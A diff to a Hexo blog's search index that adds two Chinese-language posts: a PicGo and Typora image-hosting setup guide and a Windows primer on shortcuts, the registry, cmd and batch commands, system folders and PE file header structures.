@@ -3,7 +3,7 @@
   <entry>
     <title>Misc</title>
     <url>/2023/08/27/Misc/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>涉及常见的编码与隐写术，关于数字取证与流量分析将会在以后进行补充（maybe）</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：涉及常见的编码与隐写术，关于数字取证与流量分析将会在以后进行补充（maybe）</p>
 <span id="more"></span>
 
 <h3 id="0x01编码与古典密码"><a href="#0x01编码与古典密码" class="headerlink" title="0x01编码与古典密码"></a>0x01编码与古典密码</h3><p><strong>编码</strong>：将一定序列的二进制串赋予意义；ASCII码、GBK(GB2312&#x2F;18030)、UTF、ANSI；在早期还有专用的数字编码，即二-十进制编码（BCD码）：8421码、2421码、格雷码；为保证传输数据的准确性，再加入额外的可信性编码：奇偶校验码、海明码、ECC（椭圆曲线？）、Chipkill等；</p>
@@ -133,9 +133,1411 @@ AVI:头41-56-49-20
       </tags>
   </entry>
   <entry>
+    <title>图床配置</title>
+    <url>/2023/09/28/PicGo%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：感觉blog有时还是有图片才能说清楚。配置采用ImgTP+PicGo+Typora</p>
+<span id="more"></span>
+
+<h3 id="PicGo-Typora"><a href="#PicGo-Typora" class="headerlink" title="PicGo+Typora"></a>PicGo+Typora</h3><h4 id="安装PicGo"><a href="#安装PicGo" class="headerlink" title="安装PicGo"></a>安装PicGo</h4><p>首先需要保证有安装node.js<span class="exturl" data-url="aHR0cHM6Ly9ub2RlanMuY24vZG93bmxvYWQv">下载 | Node.js 中文网 (nodejs.cn)<i class="fa fa-external-link-alt"></i></span>，且版本&gt;&#x3D;16。官网<span class="exturl" data-url="aHR0cHM6Ly9waWNnby5naXRodWIuaW8vUGljR28tRG9jL3poLw==">PicGo<i class="fa fa-external-link-alt"></i></span></p>
+<p><img src="https://img1.imgtp.com/2023/09/28/DQauhJgK.png" alt="image-20230928114412259"></p>
+<p>进入下载安装界面，最新的测试版版（2.4）的能够在github中找到，其余的都是正式发行版（2.3.1）</p>
+<p>安装正式版的即可，没有多大的区别</p>
+<p>这里以山东大学镜像站为例子，进入其右侧链接</p>
+<p><img src="https://img1.imgtp.com/2023/09/28/rrEcNADX.png" alt="image-20230928114745451"></p>
+<p>之后点击v2.3.1即可下载，安装。具体安装过程不再演示</p>
+<h4 id="配置PicGo"><a href="#配置PicGo" class="headerlink" title="配置PicGo"></a>配置PicGo</h4><p>PicGo的作用仅相当于快速帮助我们将图片上传到图床中，所以我们还需要配置图床。下面是其默认支持的图床</p>
+<p><img src="https://img1.imgtp.com/2023/09/28/jV90Xtvq.png" alt="image-20230928115100677"></p>
+<p>本人选择的是imgtp（穷啊）<span class="exturl" data-url="aHR0cHM6Ly93d3cuaW1ndHAuY29tLw==">ImgTP - 免费公共图床<i class="fa fa-external-link-alt"></i></span></p>
+<p>当然还有其他许多图床以插件的形式支持，具体请见<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BpY0dvL0F3ZXNvbWUtUGljR28=">GitHub - PicGo&#x2F;Awesome-PicGo: A collection of awesome projects using PicGo.<i class="fa fa-external-link-alt"></i></span></p>
+<p><img src="https://img1.imgtp.com/2023/09/28/QASEnLlP.png" alt="image-20230928120129720"></p>
+<p>如果选择的图床并非上述默认支持，可以在PicGo的 “插件设置” 中进行搜索，之后安装。上述网站中的插件大部分可以用这种方式，少部分需要手动安装，这里不过多叙述</p>
+<p><img src="https://img1.imgtp.com/2023/09/28/DiKzrZcX.png" alt="image-20230928130909949"></p>
+<p>在图床注册号帐号之后，在设置里找到Token项，copy一下</p>
+<p><img src="https://img1.imgtp.com/2023/09/28/hdgfMkRs.png" alt="image-20230928115831774"></p>
+<p>之后进入到PicGo中，插件选项，配置uploader-imgtp</p>
+<p><img src="https://img1.imgtp.com/2023/09/28/J84T068l.png" alt="image-20230928120022812"></p>
+<p>按照框子进行输入（该图床插件并不需要Token，但是大多都是必须的）</p>
+<p><img src="https://img1.imgtp.com/2023/09/28/pgMta4TP.png" alt="image-20230928120243184"></p>
+<p>确认之后，记得到PicGO的图床设置中，将你的图床设置为默认图床</p>
+<h4 id="配置Typora"><a href="#配置Typora" class="headerlink" title="配置Typora"></a>配置Typora</h4><p>在Typora中找到 “文件” ——&gt; “偏好设置” ——&gt; “图像”，进行如下配置：</p>
+<p><img src="https://img1.imgtp.com/2023/09/28/yMn2nLmS.png" alt="image-20230928120852234"></p>
+<p>之后点击 “验证图片上传选项”，成功的话会有如下显示</p>
+<p><img src="https://img1.imgtp.com/2023/09/28/PXUrcHIG.png" alt="image-20230928121022365"></p>
+<p>到这里，就配置完成了，每次在Typora中粘贴图像时，都会自动上传到图床中，上传的图片可以在PicGo的相册看到</p>
+<h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><ol>
+<li>端口设置，一般默认就好，配置端口36677（位置在”PicGo设置”——&gt;”设置Server”）</li>
+</ol>
+<img src="https://img1.imgtp.com/2023/09/28/tiTBNHVq.png" alt="image-20230928131205132" style="zoom:80%;" />
+
+<p>​	需要与Typora的端口设置对应，也就是上面验证时的命令：</p>
+<p>​	<code>using http://127.0.0.1:36677/upload</code></p>
+<ol start="2">
+<li>后端Token获取失败，需要在配置时，将”上传模式”更改为<code>Front-End</code></li>
+</ol>
+<p><img src="https://img1.imgtp.com/2023/09/28/q5TwMjjL.png" alt="image-20230928131525676"></p>
+<ol start="3">
+<li>有时显示该图片被阻塞，大概率是墙的问题。就比如SM.MS图床，就需要设置它的备用域名</li>
+</ol>
+<p><img src="https://img1.imgtp.com/2023/09/28/V60z4Ic6.png" alt="image-20230928131830217"></p>
+<p>注意：大多图床都会检测VPN，如果是开着梯子上传的，则会上传失败</p>
+]]></content>
+      <tags>
+        <tag>环境配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows讲解</title>
+    <url>/2023/09/07/Windows%E4%B8%8D%E8%AE%B2%E5%86%85%E6%A0%B8/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：涉及快捷方式、cmd命令、PE文件等windows相关内容</p>
+<span id="more"></span>
+
+<h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00.基础"></a>0x00.基础</h3><table>
+<thead>
+<tr>
+<th>快捷键</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WIN+E、I、M、R、V、+&#x2F;-</td>
+<td>文件管理、设置、最小化(多个shift还原)、运行、剪切板、放大缩小</td>
+</tr>
+<tr>
+<td>CTRL+Z、Y、shift+Esc、Shift+N</td>
+<td>撤销、恢复、任务管理器、新建文件夹</td>
+</tr>
+<tr>
+<td>alt+F4、Enter</td>
+<td>关闭当前程序、查看文件属性</td>
+</tr>
+<tr>
+<td>Shift+delete</td>
+<td>永久删除，不在回收站</td>
+</tr>
+<tr>
+<td>F11</td>
+<td>全屏</td>
+</tr>
+</tbody></table>
+<p><strong>文件扩展</strong>：仅仅用来告诉程序如何打开该文件，并不会对文件内容有啥破坏。</p>
+<ol>
+<li><p>.inf文件即驱动的说明文件；驱动，即硬件驱动程序，是使硬件正常工作的一种软件；.inf文件里存放着关于驱动的适配厂商，版本号等信息</p>
+</li>
+<li><p>.sys文件，系统级驱动程序文件的可执行代码</p>
+</li>
+<li><p>.dll，动态链接库；.lib静态链接库</p>
+</li>
+<li><p>.bin，二进制文件</p>
+</li>
+<li><p>.ini文件即初始化文件；是windows系统配置文件采用的存储格式；类似功能还有.cfg、.conf、.tx*</p>
+<blockquote>
+<p>.ini文件由若干节（[xxxx]中括号包围）构成，每节都由若干键-值构成（abb&#x3D;xxxx），分号用于表示注释，直到行末；目前还存有少数.ini文件，大多都用注册表代替</p>
+</blockquote>
+</li>
+</ol>
+<p><strong>环境变量</strong>：简单来说就是告诉计算机，你这个程序在哪里，可以方便操作系统打开这个程序。格式<code>%xxx%</code>包括用户变量和系统变量：</p>
+<ul>
+<li>用户变量指的就是操作系统对于当前用户（多用户）所能够快速操作的程序</li>
+<li>系统变量就是该操作系统（多系统）可以快速打开的程序</li>
+</ul>
+<p><code>dir env:</code>显示所有环境变量；<code>$env:Path</code>显示Path环境变量；<code>$env:Path +=&quot;;C:\xx&quot;</code>添加环境变量（在CLI中仅限当前，关闭后消失）</p>
+<p><strong>注册表</strong>：用来管理计算机的各个软硬件，包括控制面板、任务管理器、时间的改写、系统开机显示等偏向系统方向的内容，记录了用户安装在计算机上的软件和每个程序的相互关联信息，可以说是一种数据库；结构为：根键——项——值；</p>
+<ul>
+<li><p>根键：最大的文件夹，以HKEY为前缀，全大写</p>
+<table>
+<thead>
+<tr>
+<th>根键名称</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HKEY_LOCAL_MACHINE</td>
+<td>与机器硬件有关部分</td>
+</tr>
+<tr>
+<td>HKEY_USERS</td>
+<td>包含了所有的用户（xxx1&amp;xxx2）的设置信息</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_USER</td>
+<td>当前用户的信息，从第二项中单独分离出来的</td>
+</tr>
+<tr>
+<td>HKEY_CLASSES_ROOT</td>
+<td>定义文件扩展名、类型、图标等;从H1\software\classes分离</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_CONFIG</td>
+<td>相关配置的驱动的加载；从H1\config中分离</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>项：小文件夹，除了大的文件夹都是项</p>
+</li>
+<li><p>值：包括三部分：值的名称—值的类型—值的数据</p>
+<table>
+<thead>
+<tr>
+<th>值类型</th>
+<th>具体</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>REG_SZ&#x2F;字符串值</td>
+<td>固定长度字符串</td>
+</tr>
+<tr>
+<td>REG_BINARY二进制值</td>
+<td>多数硬件组成信息存储</td>
+</tr>
+<tr>
+<td>DWORD&#x2F;QWORD</td>
+<td>数据的表示是4字节长&#x2F;8字节长，大多驱动参数为DWORD</td>
+</tr>
+<tr>
+<td>REG_MULTI_SZ多字符串值</td>
+<td>含有多个文本值的字符串</td>
+</tr>
+<tr>
+<td>REG_DWORD可扩充字符串值</td>
+<td>解析的变量？</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<p><strong>用户账户管理UAC</strong>：</p>
+<p>目前win10以后有如下账户，管理员用户（Ad）、Guest、Default（防止系统引导出错的账户）、WDAGUtility（Defender账户）、自己的账户；</p>
+<blockquote>
+<p>（在专业版中能GUI查看，家庭版命令net user可以进行管理）</p>
+</blockquote>
+<p><img src="https://img1.imgtp.com/2023/10/01/4tNIVTRV.png" alt="image-20231001155146815"></p>
+<p>用户组则是用于将相同类型的账号进行分类，每组权限不一，且不同组的共享资源是可以相互访问的。默认包括：Administrator组、Users组、Guest组。</p>
+<p>自己的账户，默认处于用户组和管理员组，只有相关操作时才会暂时升到管理员权限</p>
+<p><strong>常见进程</strong>：</p>
+<ul>
+<li>System进程：用于实现页面内存管理的进程，最高优先级。</li>
+<li>csrss：客户端服务子系统(Client&#x2F;Server Runtime Subsystem)；控制 Windows图形相关子系统</li>
+<li>Lsass：本地安全权限服务；本地安全权限服务控制Windows安全机制。</li>
+<li>Explorer：资源管理器；管理Windows图形Shell,包括开始菜单，任务栏，桌面和文件管理</li>
+<li>Taskmgr：Windows任务管理器；执行Windows的任务。</li>
+<li>Winlogon：Windows登陆进程；Windows用户的登陆程序。  </li>
+<li>Svchost：主机服务程序；标准的动态链接库主机处理服务。</li>
+<li>Services：Windows服务控制；管理Windows服务。</li>
+</ul>
+<h3 id="0x01-命令与批处理脚本"><a href="#0x01-命令与批处理脚本" class="headerlink" title="0x01.命令与批处理脚本"></a>0x01.命令与批处理脚本</h3><p>cmd是windows下模仿DOS操作系统（之前的磁盘操作系统）的程序，但受到windows的限制，即不可能删除windows文件，但在DOS系统下可以；cmd也可以叫做bat，用cmd编写的脚本类似于Linux下的shell脚本，dos或win下的这样批处理脚本后缀.bat或.cmd</p>
+<blockquote>
+<p>这里再另外介绍以下powrshell，部分命令与cmd相同，大部分命令进行更新，更换为更容易理解的动名词短语形式。此外cmd类似于解释器，而powrshell的相当于一门面向对象的语言，借助.net平台（和win集成）可以运行其他许多在.net平台上编写的程序，也可向下兼容cmd的批处理脚本，对应脚本.ps1（使用的语法叫做cmdlet）</p>
+</blockquote>
+<h4 id="运行win-R键"><a href="#运行win-R键" class="headerlink" title="运行win+R键"></a>运行win+R键</h4><p>.cpl : 即Control Panel extension控制面板扩展程序</p>
+<p>.msc ：即Micosoft management Console微软管理控制台</p>
+<pre><code class="powershell">winver-------------------查看windows版本
+regedit------------------打开注册表编辑器
+firewall.cpl-------------防火墙
+mstsc--------------------远程桌面连接
+compmgmt.msc-------------计算机管理
+services.msc-------------服务管理
+optionalfeatures---------可选功能(如Hyper-V)
+appwiz.cpl---------------卸载更改程序
+shutdown-----------------关机
+certmgr.msc--------------证书管理
+control------------------打开控制面板
+appwiz.cpl---------------卸载部分软件
+</code></pre>
+<h4 id="cmd基本命令"><a href="#cmd基本命令" class="headerlink" title="cmd基本命令"></a>cmd基本命令</h4><pre><code class="powershell">help balabala(查询balabala命令的详细用法)
+---------------目录----------------------------
+cd..(返回上一级)
+cd \(返回根目录)
+cd /d d:/test(切换到d盘的test文件夹，/d为参数)
+------------文件相关----------------------------
+dir(显示当前目录下文件夹)
+tree d:/test(树状列出)
+md test6(建立test6文件夹)
+rd test6(删除test6文件夹,需确认)  /s(非空时需要确认) /s/q(非空时不需要确认)
+copy/move  d:\test1  e:\test2(把test1文件夹复制/移动到test2文件夹下)
+del test5.pdf(专门删除文件，不是文件夹，不经常回收站)
+ren d:\test1  test4(重命名文件/文件夹)
+attrib--------------(设置文件属性)
+------------网络-------------------------------
+ping ip/域名(测试连通)   -n 5(测试五次)
+tracert ip/域名(路由追踪)
+ipconfig(查看本机ip)
+arp(用于显示连接在同一网段下的其他IP)
+------------进程-------------------------------
+tasklist(显示当前正在运行的进程)
+start xx.exe(开启某程序)
+taskkill /im xxx.exe(按照名称关闭进程)
+taskkill /pid 123456(按PID关闭进程)
+------------其他-------------------------------
+shutdown /s(关机) /r(重启) /h|f(休眠) /a(取消关机) /s /t 100(100s后关机)
+cls(清屏)
+F7(查看所有执行过的命令，左边会有编号)
+F9(搭配F7，按照编号选择命令)
+</code></pre>
+<h4 id="批处理脚本"><a href="#批处理脚本" class="headerlink" title="批处理脚本"></a>批处理脚本</h4><p>后缀文件保存为.bat，双击即可食用；至于脚本，是因为同样类似于解释型语言，一条条翻译运行；</p>
+<p>cmd窗口与python的交互窗口类似；当然下面所列的也可以在cmd窗口中直接运行；可以与正则表达式配合使用</p>
+<pre><code class="cmd">-------------条件循环-------
+if %a% equ %b% (echo yes) else (echo no)	#如果a=b..
+#exit(存在哪个文件)equ(相等);neq(不等);lss(小于);leq(小或等);gtr(大于);geq(大或等);
+for  %%I in (ABC) do echo %%I	#输出ABC
+#for %I in(内容1，内容2...) do command (在bat文件中用%%I)
+
+------------显示与变量设置---
+echo (显示当前回显状态)
+@echo off (从本行开始关闭回显，去掉@则从下行开始，on则打开，@负责单行的回显，一般作为文件开始)
+set a=aaa (设置变量a值为“aaa”，不要用%0~9)
+echo %a% (输出变量a的值)
+rem (注释)
+%0 %1.....%9 (第0-9个参数，%0表示自身，指的是在命令行中运行脚本时带的参数)
+-------------其他----------
+title xxx (变更窗口标题)
+pause (暂停)
+&amp;(顺序执行多条命令，不管结果)
+&amp;&amp;(顺序执行，碰到错误命令后不再执行)
+||(顺序执行命令，碰到正确后不再执行)
+|  (管道符，后面的做前面的输入)
+&gt;(清除原本内容后再写入)
+&gt;&gt;(接着写)
+</code></pre>
+<blockquote>
+<p>在PS中默认不支持脚本，需要用管理员权限开启，并输入<code>Set-ExecutionPolicy RemoteSigned</code>更改执行策略</p>
+</blockquote>
+<h3 id="0x02-系统文件"><a href="#0x02-系统文件" class="headerlink" title="0x02.系统文件"></a>0x02.系统文件</h3><p>ps: $开头的一般均为临时文件；</p>
+<ol>
+<li>Windows：win系统文件</li>
+</ol>
+<ul>
+<li>addins：存放系统附加功能</li>
+<li>appcompat：应用兼容性相关</li>
+<li>apppath：保存程序的修补备份文件</li>
+<li>assembly：由.Net Framwork自动创建，包含多个托管模块以及一些资源文件的逻辑组合；</li>
+<li>boot：主要功能为一键备份所需，可删；另一个boot.ini为系统启动时的引导文件；</li>
+<li>Debug：系统层面的调试文件夹，存放调试日志.log</li>
+<li>Downloaded Program Files：存放过去的IE浏览器扩展，目前已空；可删；</li>
+<li>Help：Windows帮助文件；可扔；</li>
+<li>INF：存放 为硬件提供服务的.inf文件和.pnf文件；</li>
+<li>Microsoft.NET：.net根据官方文档，电脑的驱动以及系统更新需要此支持；</li>
+<li>Offline web pages：脱机浏览文件，即没网的时候仍可浏览的网页；</li>
+<li><strong>PLA</strong>：性能日志和警报，依据性能计数器阈值生成警报等；</li>
+<li>Prefetch：存放系统预读取过的信息，加快访问速率；可删内容；</li>
+<li><strong>security</strong>：系统重要的数据文件；</li>
+<li><strong>System32</strong>：存放64位的windows系统；<ul>
+<li>drivers：里面存放驱动程序文件的可执行代码.sys文件</li>
+</ul>
+</li>
+<li><strong>SysWOW64</strong>：是64位的windows用来存放32位windows的地方；</li>
+<li>TAPI：win升级时备份的旧版本文件；可删；</li>
+<li>TEMP：系统运行过程中的的临时文件夹；需清理；</li>
+<li>Templnst：存储部分应用的离线模板文件夹；</li>
+<li>Tracing：WindowsLiveMassage会创建的文件；现在没啥用；</li>
+<li>twain_32：实现扫描功能，需外接设备；没啥用；</li>
+<li><strong>WinSxS</strong>：存放不同版本的windows组件，减少dll引起的不同版本引用的问题</li>
+</ul>
+<ol start="2">
+<li><p>Program File：系统中64位软件的安装目录</p>
+</li>
+<li><p>Program File(x86)：系统中32位软件安装目录</p>
+</li>
+<li><p>Program Data：放置程序使用数据等</p>
+</li>
+<li><p>Users：存储系统所有用户的软件及数据等；包括桌面和开始菜单</p>
+<ul>
+<li>Default：存放创建新账户时的配置文件</li>
+<li>Lenovo：Lenovo用户的存储的数据内容（这里主要介绍其中AppDate里的内容）<ul>
+<li>Local：与安装的程序相关的文件夹，其中的数据不会因为用户的切换而无法显示</li>
+<li>LocalLow：低级别访问数据</li>
+<li>Roaming：可随着用户的配置而转移的数据</li>
+</ul>
+</li>
+<li>公用：所有用户可用文件夹</li>
+</ul>
+</li>
+<li><p>Intel：安装驱动时的文件夹，安装过后可扔</p>
+</li>
+</ol>
+<blockquote>
+<p> 下面是Windows文件夹下一些主题配置相关文件</p>
+<p>Cursors：鼠标指针，以.cur格式存放。en-US、zh-CN：语言文件夹。</p>
+<p>Fonts：字体文件。IME：存放系统默认的输入法。</p>
+<p>Media：系统提示音等。Resources：系统主题文件。Web：系统自带的图片壁纸</p>
+</blockquote>
+<h3 id="0x03-PE文件"><a href="#0x03-PE文件" class="headerlink" title="0x03.PE文件"></a>0x03.PE文件</h3><p>PE（Portable Executable），可移植的可执行文件。由COFF（UNIX下的通用对象文件格式）发展过来，对应Linux下的ELF文件；PE指的32位的可执行文件也叫PE32，对于64位的叫PE+或PE32+是一种扩展形式</p>
+<p>二进制下打开4D 5A开头对应ASCII码中的MZ，其后面不远就有PE，这些标志着PE文件的叫做PE指纹；整体结构：DOS首部—NT映像头—块表&#x2F;节表—块&#x2F;节</p>
+<blockquote>
+<p>详细概述见<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3dpbmRvd3Mvd2luMzIvZGVidWcvcGUtZm9ybWF0">PE 格式 - Win32 apps | Microsoft Learn<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>种类</th>
+<th>后缀</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>可执行系列</td>
+<td>.exe  &amp;&amp; .scr</td>
+</tr>
+<tr>
+<td>库系列</td>
+<td>.dll &amp;&amp; .ocx &amp;&amp; .cpl &amp;&amp; .drv</td>
+</tr>
+<tr>
+<td>驱动程序系列</td>
+<td>.sys  &amp;&amp; .vxd</td>
+</tr>
+<tr>
+<td>对象文件系列</td>
+<td>.obj</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p>DOS部首：DOS MZ(4D 5A)文件头，DOS块共64字节，最低四字节，存放着PE的地址，在DOS MZ和PE头之间剩下的是DOS插桩程序。是一个在DOS环境下显示”This program can not be run in DOS mode”或”This program must be run under Win32”的小程序</p>
+</li>
+<li><p><strong>PE文件头&#x2F;NT映像头</strong>：4B+20B+224B；这里以32位做实例，存在于&lt;winnt.h&gt;头文件中，详情参考<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3dpbmRvd3Mvd2luMzIvYXBpL3dpbm50L25zLXdpbm50LWltYWdlX250X2hlYWRlcnMzMg==">Microsoft Learn<i class="fa fa-external-link-alt"></i></span></p>
+<pre><code class="c++">typedef struct _IMAGE_NT_HEADERS &#123;
+    DWORD Signature;		//字串，4B
+    IMAGE_FILE_HEADER FileHeader;		//映像文件头，20B
+    IMAGE_OPTIONAL_HEADER32 OptionalHeader;	//可选映像头，224B，64位下240B
+&#125;IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
+</code></pre>
+<ol>
+<li><p>字串：”50\45\00\00”&#x3D;”PE\0\0”标志着NT头的开始；在DOS程序头的3CH位置的四个字节，是前面字符串的偏移地址。</p>
+</li>
+<li><p>映像文件头（main）：</p>
+<pre><code class="c++">typedef struct _IMAGE_FILE_HEADER&#123;
+    WORD Machine		//机器类型,x86=14CH
+    WORD NumberOfSection		//文件中节的个数,important,每个节固定40字节
+    DWORD TimeDateStamp		//文件生成的时间戳
+    DWORD PointerToSymbolTable		//COFF符号表的偏移（用于调试）
+    DWORD NumberOfSymbols		//符号表中的符号数目（用于调试）
+    WORD SizeOfOptionalHeader		//可选头大小,important,用于寻找节表的开始位置
+    WORD Characteristics		//文件属性
+&#125;IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
+</code></pre>
+</li>
+<li><p>可选映像头：</p>
+<pre><code class="c++">typedef struct _IMAGE_OPTIONAL_HEADER &#123;
+  WORD Magic;		//幻数，一般是010BH
+  BYTE MajorLinkerVersion;		//连接程序的主版本号
+  BYTE MinorLinkerVersion;		//连接程序次版本号
+  DWORD SizeOfCode;		//代码段总尺寸-important-对齐后的值
+  DWORD SizeOfInitializedData;		//已初始化数据总尺寸
+  DWORD SizeOfUninitializedData;	//未初始化数据总尺寸
+  DWORD AddressOfEntryPoint;	//开始执行位置-important!!!
+  DWORD BaseOfCode;		//代码节开始位置-important
+  DWORD BaseOfData;		//数据节开始位置
+  DWORD ImageBase;		//可执行文件默认装入的基地址-如果装入时用该值做基地址则无需再重定位,EXE默认400000H，DLL默认10000000H
+  DWORD SectionAlignment;	//装入内存时节的对齐数字
+  DWORD FileAlignment;		//节的对齐数字，一般是扇区长（512B）
+  WORD MajorOperatingSystemVersion;		//要求最低的OS主版本号
+  WORD MinorOperatingSystemVersion;		//最低OS的次版本号
+  WORD MajorImageVersion;		//可执行文件主版本号
+  WORD MinorImageVersion;		//次版本号
+  WORD MajorSubsystemVersion;	//最小子系统主版本号
+  WORD MinorSubsystemVersion;	//最小子系统次版本号
+  DWORD Win32VersionValue;	//保留，一般0
+  DWORD SizeOfImage;		//装入内存后映像的总尺寸-SectionAlignment的整数倍
+  DWORD SizeOfHeaders;		//NT映像头+节表大小
+  DWORD CheckSum;		//CRC检验和，一般EXE为0，
+  WORD Subsystem;		//可执行文件的子系统
+  WORD DllCharacteristics;		//何时被DllMain调用
+  DWORD SizeOfStackReserve;		//初始化线程时保留的栈大小
+  DWORD SizeOfStackCommit;		//提交的栈大小
+  DWORD SizeOfHeapReserve;		//保留堆大小
+  DWORD SizeOfHeapCommit;		//提交堆大小
+  DWORD LoaderFlags;		//与调试有关
+  DWORD NumberOfRvaAndSizes;	//数据目录的项数，一般16
+  IMAGE_DATA_DIRECTORY 	DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];	//数据目录，存放该可执行文件上一些重要部分的起始RVA和尺寸
+&#125;IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
+</code></pre>
+</li>
+</ol>
+</li>
+<li><p>节表&#x2F;块表：用来说明节的具体信息，每个节都有一个节表，节表数量由映像文件头决定；一个节表40B；通俗版参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuNTJwb2ppZS5jbi90aHJlYWQtMTQwNzk5Ni0xLTEuaHRtbA==">PE文件笔记六 节表和节<i class="fa fa-external-link-alt"></i></span></p>
+<blockquote>
+<p>VA：内存中虚拟地址；RVA：相对虚拟地址的偏移；FA：文件的地址；FOA：在文件中的偏移地址，没有被载入内存；VA &#x3D; RVA + ImageBase</p>
+</blockquote>
+<pre><code class="c++">typedef struct _IMAGE_SECTION_HEADER &#123;
+  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];		//8字节的节名，数组表示
+  union &#123;
+    DWORD PhysicalAddress;
+    DWORD VirtualSize;
+  &#125; Misc;		//obj文件用来表示本节物理地址，EXE文件中表示节的实际字节数
+  DWORD VirtualAddress;		//加载进内存后，本节的偏移地址地址
+  DWORD SizeOfRawData;		//未加载的文件在对齐后的节的尺寸
+  DWORD PointerToRawData;		//本节在原始文件中的偏移地址
+  DWORD PointerToRelocations;	//obj文件中表示该节重定位信息的偏移，EXE中无意义
+  DWORD PointerToLinenumbers;	//行号表位置
+  WORD  NumberOfRelocations;		//需要重定位的数目
+  WORD  NumberOfLinenumbers;		//在行号表中的行号数目
+  DWORD Characteristics;		//节属性-代码节=60000020h即可执行、可读、节中包含代码-数据节=C0000040h即可读、可写、包含已初始化数据
+&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
+</code></pre>
+<p>根据可执行文件获取每一节在内存中位置：</p>
+<ol>
+<li>读取<code>IMAGE_FILE_HEADER.NumberOfSection</code>，获取<strong>节</strong>数目</li>
+<li>读取<code>IMAGE_OPTIONAL_HEADER.SizeOfHeaders</code>来定位<strong>节表</strong>的位置</li>
+<li>对于每一节，首先读取<code>IMAGE_SECTION_HEADER.PointerToRawData</code>来得到该<strong>节</strong>在原始文件中的偏移地址—FOA，读取<code>IMAGE_SECTION_HEADER.SizeOfRawData</code>得到<strong>节</strong>在原始文件中的总字节数</li>
+<li>读取<code>IMAGE_OPTIONAL_HEADER.ImageBase</code>得到<strong>文件</strong>在内存中的基地址—ImageBase，之后读取<code>IMAGE_SECTION_HEADER.VirtualAddress</code>获得本<strong>节</strong>相对于文件的偏移地址—RVA，两者再相加获得本节的虚拟地址—VA，同时根据<code>IMAGE_SECTION_HEADER.Characteristics</code>获取节的具体属性</li>
+</ol>
+</li>
+<li><p>节数据：</p>
+<ol>
+<li><p>代码节.text或.code：PE文件均有，含有程序可执行代码</p>
+</li>
+<li><p>引出函数节.edata：一般在DLL中，本文件向其他文件提供的可调用函数列表</p>
+<pre><code class="c++">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;
+    DWORD   Characteristics;	//属性，一般为0
+    DWORD   TimeDateStamp;		//文件生成时间戳
+    WORD    MajorVersion;		//主版本号
+    WORD    MinorVersion;		//次版本号
+    DWORD   Name;		//指向的DLL名字
+    DWORD   Base;		//导出函数的起始序列号，与下面的序号y相加得到对应函数的导出序号
+    DWORD   NumberOfFunctions;		//所有导出函数的总数
+    DWORD   NumberOfNames;		//有名称的导出函数总数，都有序号
+    DWORD   AddressOfFunctions;     //指向函数地址数组，每个成员占4B，表示相应函数的RVA
+    DWORD   AddressOfNames;         //指向一个数组，里面装的是4B的地址，该地址下存放的是函数名字字符串，借此数组与我们需要的函数名称进行对比，我们可以找到目标的序号x
+    DWORD   AddressOfNameOrdinals;  //指向一个序号对应数组，由上面的序号x，查找得到需要的函数地址在AddressOfFunction中的序号y
+&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
+</code></pre>
+</li>
+<li><p>引入函数节.idata：<code>IMAGE_IMPORT_DESCRIPTOR</code>结构数组，每引入一个DLL，数组就多一项</p>
+<pre><code class="c++">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;
+    union &#123;
+        DWORD   Characteristics;
+        DWORD   OriginalFirstThunk;
+    &#125; DUMMYUNIONNAME;		//IMAGE_THUNK_DATA数组的指针，在文件中与FirstThunk指向一样，内存中不同
+    DWORD   TimeDateStamp;		//文件建立时间戳
+    DWORD   ForwarderChain;		//引用的DLL的API，又引用了其他DLL的API，现在一般为0
+    DWORD   Name;		//指向的DLL名字
+    DWORD   FirstThunk;		//通常是一个RVA，指向IMAGE_THUNK_DATA结构（该结构说明函数的导入方式）
+&#125; IMAGE_IMPORT_DESCRIPTOR;
+typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;
